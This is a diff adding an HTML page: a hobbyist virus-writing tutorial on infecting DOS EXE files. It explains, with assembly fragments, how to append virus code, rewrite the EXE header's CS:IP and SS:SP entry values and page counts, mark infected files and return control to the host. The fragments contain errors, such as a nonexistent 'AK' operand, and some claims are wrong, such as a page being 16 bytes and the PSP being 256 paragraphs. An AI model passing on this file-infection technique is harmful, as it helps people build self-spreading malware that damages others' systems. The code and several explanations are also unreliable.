@@ -1,0 +1,258 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - EXE Infections</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<p align="center"><b><font color="#004080" size="+3">EXE Infections</font><font color="#004080"><br>
+  <font size="+1">by BadgerX</font></font></b></p>
+<p align="center"><font size="-1"><a href="tumisc62.htm">[see also: COM Infections 
+  by BadgerX]</a></font></p>
+<hr>
+<p>Welcome to my second tutorial: Exe Infections. This is a milestone for you 
+  to get over. If you do, and you can fully understand what's going on, you are 
+  on yer way to graduation from newbiness. Exe infections present a dive into 
+  the complex. It took my a long time to get it, and I hope that through my trials, 
+  I will be able to explain it better to you, in hopes that you will understand.<br>
+  <br>
+  <b>Minipulating CS:IP and SS:SP</b></p>
+<p>Once we find a target, we will save these and other critical values. We will 
+  point CS to the last segment of the file by subtracting the header size from 
+  the filesize(header and the real file) so that we will get the distance from 
+  the end of the header to the end of the file. We point it to there, because 
+  that's where we append the virus. Remember, this cs value is stored in the header 
+  in page displacement. Page meaning that it's in 16 byte increments, and displacement 
+  meaning that it's a distance jump; it doesn't point to a specific locations. 
+  So, if we're putting the virus at the end of the file, the new CS formula will 
+  be:<br>
+  <br>
+  CS=(Total Filesize - Header Size) / 16<br>
+  <br>
+  Simple so far. The stack SEGMENT will be the same, it will reside in the last 
+  segment, where our virus is. We will set the STACK POINTER about 100 bytes past 
+  our file, so that the stack will not overwrite us. (the stack grows upwards). 
+</p>
+<pre align="left"><font face="Fixedsys">   </font>PSP
+   HEADER
+   FILE
+   FILE
+   FILE
+   VIRUS
+      .   &lt;--,   
+     /|\     |---100 bytes for stack growth
+      |      |
+   STACK &lt;--'</pre>
+<p align="left"><b>CS:IP MInipulation</b>
+<blockquote>
+  <p>;-]assumes buffer has read<br>
+    ;-]header from target and<br>
+    ;-]filesize in ax:dx from<br>
+    ;-]filepointer to end<br>
+    push ax dx<br>
+    ;^save filesize<br>
+    mov ax, word ptr [bp+offset buffer+8]<br>
+    ;^get headersize<br>
+    mov cl, 4<br>
+    shl ax, cl<br>
+    xchg ax, bx<br>
+    ;^multiply by 16, to get<br>
+    ;^the header's para. size<br>
+    <br>
+    pop ax dx<br>
+    ;^retrieve filesize<br>
+    <br>
+    sub ax, bx<br>
+    sbb dx, 0<br>
+    ;^subtact headersize from<br>
+    ;^file size.. in bytes<br>
+    <br>
+    mov cx, 10h<br>
+    div cx<br>
+    ;^to segment para displacement<br>
+    ;^by dividing ax by 161<br>
+    <br>
+    mov cx, dx<br>
+    add cx, 64h                 
+    <br>
+    ;^give stack room (100d) <br>
+    <br>
+    mov word ptr [bp+offset buffer+14h], dx<br>
+    ;^new IP<br>
+    mov word ptr [bp+offset buffer+10h], cx<br>
+    ;^new SP<br>
+    <br>
+    mov word ptr [bp+offset buffer+16h], ax<br>
+    ;^new CS<br>
+    mov word ptr [bp+offset buffer+0Eh], ax<br>
+    ;^new SS<br>
+    <br>
+    mov word ptr [bp+offset buffer+12h], AK<br>
+    ;^infection mark<font color="#47533F"></font></p>
+</blockquote>
+<p><b>Other Header Values</b></p>
+There are just a few more values in the header that need to be compensated for. 
+Let's have a look at the entire Exe header.<br>
+<pre>   <u>OFFS</u>   <u>WHAT IT IS</u>
+   _00     MZ
+   <font color="#2E3824">*</font>02     # of bytes in last    512 byte page
+   <font color="#2E3824">*</font>04     # of 512 byte pages    in the file
+   _06     Number of entries in the segment table
+   _08     Size of the header in 16 byte paragraphs
+   <font color="#2E3824">*</font>0A     Minimum memory required    in paragraphs
+   _0C     Maximum memory requested in paragraphs
+   <font color="#2E3824">*</font>0E     SS in 16 by paragraphs    from header
+   <font color="#2E3824">*</font>10     SP in offset from SS
+   <font color="#2E3824">*</font>12     Negative checksum
+   <font color="#2E3824">*</font>14     IP in offset from CS
+   <font color="#2E3824">*</font>16     CS in paragraphs from    header
+   _18     Offset of relocation table from start of file
+   _1A     Overlay number
+   
+   <font color="#2E3824">*</font>denotes values which MAY have to be changed
+       unnecessary:
+     -offset 12 is just a good place to mark infection
+     -offset 0A is just to be safe</pre>
+Notice that the SS:SP is stored segment first and then offset, and that CS:IP 
+are stored backwards, the offset (IP) coming before the segment(CS). On load, 
+ES and DS point to the segment of psp, but if you are writing a com/exe virus, 
+it is wise to check to make sure that ES and DS are pointing to the PSP.<font face="Fixedsys"><br>
+</font> 
+<pre><font face="Fixedsys">   </font>PSP     &lt;---- DS, ES
+   HEADER
+   FILE
+   FILE
+   FILE
+   VIRUS   &lt;---- CS:IP, SS
+      .     
+     /|\  
+      |   
+   STACK    &lt;---- SP</pre>
+<p>Not that hard, got it so far? read over it again.. NO! SERIOUSLY! it works! 
+  read over and think carefully, it might just make it in yer understanding. Unlike 
+  com files, restoration cannot be done at the beginning of the file, and then 
+  executed later.. therefore, we must keep the values that we saved from the host, 
+  all the way until we jump to another file. Therefore, we will have two variables 
+  for each of the CS:IP and for the SS:SP. The first is to keep the originals 
+  of the host and the second is to keep the originals of the file we are targeting. 
+  Most virii perform in this fassion, and upon execution of the virus, they transfer 
+  the target variables to the original. Think of it this way.. our virus targets 
+  a file, reads it's info into the target variables and writes itself to the file. 
+  When the program is executed over again, with the new virus inside, the host's 
+  originals are in the target variables, from when we inserted the virus into 
+  there. The new virus then empties the target variables into the original so 
+  that the target variables can do the same for the next infection. </p>
+<font face="Fixedsys"></font>
+<p><b>Saving Header Values</b></p>
+<blockquote>
+  <p>;assumes buffer had header read from target<br>
+    les ax, dword ptr [bp+buffer+14h]<br>
+    ;^save CS:IP<br>
+    mov word ptr [bp+origIPCS], ax<br>
+    mov word ptr [bp+origIPCS+2], es<br>
+    les ax, dword ptr [bp+buffer+0Eh]<br>
+    ;^save SS:SP<br>
+    mov word ptr [bp+origSSSP], es<br>
+    mov word ptr [bp+origSSSP+2], ax</p>
+</blockquote>
+<p><b>Checking Infection</b></p>
+<p>I've seen two ways to do this. One is to mark the SP spot with a large number 
+  always, just make sure that it's large enough to skip over yer virus and give 
+  it a few bytes. This is too complicated to be unnecessary. An easier way, at 
+  least in my opinion, is to mark offset 12h with an easy identifier, since the 
+  negative checksum is never used anyway. Simply move a word into the 12h offset 
+  and the compare it.</p>
+<p><b>Calculating Page Values</b></p>
+<p>This is an often rumored a hard routine, but it really isn't. All we have to 
+  do is get the amount of pages in the file and round them up, and then tell how 
+  many bytes are in that last page that didn't quite make it to a full page. Easily 
+  accomplished by the div command. Remember two things about this. 1) a page is 
+  simply 16 bytes and 2) div divides the values in the div routine into ax register. 
+  So if i do:</p>
+<blockquote> 
+  <p>mov cx, 4<br>
+    mov ax, 8<br>
+    div cx</p>
+</blockquote>
+<p>then ax should contain two, because cx was divided into ax. I like the codebreaker's 
+  routine to do this because it was similar to the one that i came up with and 
+  it is very straightforward.</p>
+<p><b>Calculating Page Values</b></p>
+<blockquote> 
+  <p><font color="#47533F">;assumes ax:dx has filesize<br>
+    <br>
+    </font>add ax, Vend - Vstart<br>
+    adc dx, 0<br>
+    ;^filesize+virussize<br>
+    ;^if overflowed into<br>
+    ;^cf, then add that too<br>
+    mov cx, 200h<br>
+    div cx<br>
+    ;^div 512 (200 in hex)<br>
+    <br>
+    cmp dx, 0<br>
+    ;^if remainder, round<br>
+    je no_remainder<br>
+    ;^up to another page<br>
+    inc ax<br>
+    no_remainder:<br>
+    ;^if none, then don't<br>
+    <br>
+    mov word ptr cs:[bp+header+4],ax<br>
+    ;^div 16<br>
+    mov word ptr cs:[bp+header+2],dx<br>
+    ^;mod 16</p>
+</blockquote>
+<p> <b>Returning control</b></p>
+<p>Returning control isn't that hard at all. We use 0eah and have the two words 
+  under it for it to jump to. The two words are from the CS:IP pair.</p>
+<blockquote> 
+  <p> db 0eah<br>
+    origIPCS db '0000'<br>
+    origSSSP db '0000'</p>
+</blockquote>
+<p>0eah looks for offset and then segment, and that matches up fine with the header 
+  storage of the two values. Remember, this is a common yet easily avoidable mistake.. 
+  The CS:IP is stored and u will store it backwards, IP:CS. SS:SP will be stored 
+  just the same. Remember that CS is the paragraph displacement from the header 
+  of where the file used to start before we wrote the virus. Since the file is 
+  loaded in a different starting segment each time, we need to compensate for 
+  it. This is easy. We push ES and DS at start. (remember they point to beginning 
+  of PSP). We add 10h to it to skip psp. (remember, displacement offset in paragraphs, 
+  psp is 256 paragraphs which is 10h (16d) paragraphs of 16 bytes each, so we're 
+  skipping over psp). We then add this values to both the segment registers. This 
+  is done by adding it to the CS that we're going to jump to like this:</p>
+<blockquote> 
+  <p>add word ptr cs:[bp+offset origIPCS+2], ax</p>
+</blockquote>
+<p>Since SS is changeable, and is not required in the 0eah, we will minipulate 
+  it directly, by adding it to our new translated segment.</p>
+<blockquote>
+  <p>add ax, word ptr cs:[bp+offset origSSSP]</p>
+</blockquote>
+<p>We then clear interrupts with cli so that nothing will get pushed or popped 
+  while we minipulate the stack.</p>
+<blockquote> 
+  <p>mov ss, ax</p>
+</blockquote>
+<p>Easy enough? oh, and SP? just change it to original value:</p>
+<blockquote>
+  <p>mov sp, word ptr cs:[bp+origSSSP+2]</p>
+</blockquote>
+<p>Then we'll enable interrupts again through sti and next will come the 0eah 
+  with the variables under it. I know this might seem confusing but it's really 
+  easy. Since the virus is a dropper at first, make target IP FFF0 and CS equal 
+  0000. This will return control to first instruction in the psp, the 20h terminate 
+  instruction, effectively closing the file.</p>
+<p align="left"><b>Last Points</b></p>
+<p align="left">As in other tutorials, I have armed you with the strong, essential 
+  points. I'm not going to go over newbie stuff. It seems to me that the zines 
+  at <a
+    href="http://www.codebreakers.org">www.codebreakers.org</a> are devoted torwards 
+  newbies. Read other people's tutorials, anything u can. Email me at <a
+    href="mailto:Badg3rX@hotmail.com">Badg3rX@hotmail.com</a> if you must. Buena 
+  Suerte.</p>
+<p align="left">Stay Original,<br>
+  -BadgerX</p>
+<hr>
+</body>
+</html>
